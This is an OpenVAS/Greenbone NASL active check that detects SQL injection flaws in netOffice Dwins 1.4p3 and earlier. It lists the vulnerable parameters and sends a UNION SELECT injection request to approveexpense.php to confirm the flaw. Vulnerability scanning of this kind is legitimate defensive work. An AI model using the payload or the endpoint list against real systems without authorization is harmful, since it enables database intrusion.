# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802493");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2012-11-15 16:26:54 +0530 (Thu, 15 Nov 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("netOffice Dwins Multiple <= 1.4p3 SQLi Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"netOffice Dwins is prone to multiple SQL injection (SQLi)
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed via the 'S_ATSEL' parameter to
  reports/export_leaves.php and reports/export_person_performance.php and 'id' parameter to
  expenses/approveexpense.php, calendar/exportcalendar.php, analysis/expanddimension.php, and
  analysis/changedimensionsortingorder.php is not properly sanitized before being used in a SQL
  query.");

  script_tag(name:"impact", value:"Successful exploitation will allow the attackers to manipulate
  SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"netOffice Dwins version 1.4p3 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/51198");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/79962");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/22590/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/118010/netOffice-Dwins-1.4p3-SQL-Injection.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/netoffice", "/Dwins", "/", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  url = dir + "/general/login.php";

  res = http_get_cache(port: port, item: url);

  if (!res || res !~ "^HTTP/1\.[01] 200" || (res !~ ">netOffice Dwins" && res !~ ">Powered by netOffice Dwins") ||
      res !~ "Log In<")
    continue;

  url = dir + "/expenses/approveexpense.php?id=-1%20union%20select%200," +
              "SQL-Injection-Test-&auth=-1&doc=-1";

  if (http_vuln_check(port: port, url: url, pattern: "'SQL-Injection-Test-",
                      check_header: TRUE, extra_check: make_list("SQL syntax;", "approveexpense\.php"))) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
